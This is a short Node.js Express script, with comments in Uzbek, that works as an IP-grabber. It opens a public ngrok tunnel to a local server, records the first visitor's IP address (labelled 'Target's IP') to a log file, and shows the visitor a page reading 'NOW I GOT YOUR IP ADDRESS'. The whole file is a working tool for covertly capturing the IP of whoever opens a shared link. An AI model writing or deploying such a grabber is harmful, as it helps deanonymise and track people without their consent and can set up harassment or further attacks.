const express = require('express');
const fs = require('fs');
const ngrok = require('ngrok');
const app = express();
const PORT = 7777;
let logged = false; // Flag for checking if the IP has been logged



app.use((req, res, next) => {
    if (!logged) {
        const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
        const log = `Target's IP: ${ip}\n`; // Yangi satr qo'shildi

        // IP manzilni faylga yozish
        fs.appendFile('ip_logs.txt', log, (err) => {
            if (err) throw err;
            console.log(`Target's IP:`, ip);
        });

        logged = true; // Set flag to true to prevent double logging
    }
    next();
});


// Oddiy bosh sahifa yo'nalishi

app.get('/', (req, res) => {
    res.send(`
        <html>
            <head>
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <style>
                    body {
                        margin: 0;
                        padding: 0;
                        height: 100vh;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        background-image: url('https://encrypted-tbn2.gstatic.com/images?q=tbn:ANd9GcQuYjOIrLOFywRqmdOzfXmp6M4OtHorCoWR1zTneVF_PzlqFryk');
                        background-size: cover;
                        background-position: center;
                        font-family: 'Arial', sans-serif;
                        color: #ffffff;
                        text-align: center;
                        overflow: hidden;
                    }
                    h1 {
                        font-size: 20px; /* Matn o'lchamini kichraytirdik */
                        font-weight: bold;
                        background: rgba(0, 0, 0, 0.7);
                        padding: 15px; /* Kichikroq joy */
                        border-radius: 10px;
                        box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
                        width: 80%; /* Kenglikni moslashtirish */
                        margin: 0 auto; /* Markazga joylash */
                    }

                    /* Media query: Telefonlar uchun */
                    @media (max-width: 768px) {
                        h1 {
                            font-size: 18px; /* Kichik ekranlar uchun matn hajmini yanada kichraytirish */
                            padding: 12px;
                        }
                    }

                    /* Media query: Juda kichik ekranlar uchun */
                    @media (max-width: 480px) {
                        h1 {
                            font-size: 16px; /* Super kichik ekranlar uchun matn hajmini yana kichraytirish */
                            padding: 10px;
                        }
                    }
                </style>
            </head>
            <body>
                <h1>NOW I GOT YOUR IP ADDRESS</h1>
            </body>
        </html>
    `);
});




// Serverni ishga tushirish
app.listen(PORT, async () => {
    const tunnel = await ngrok.connect(PORT)
    console.log(`Ngrok tunnel: ${tunnel}`);
});

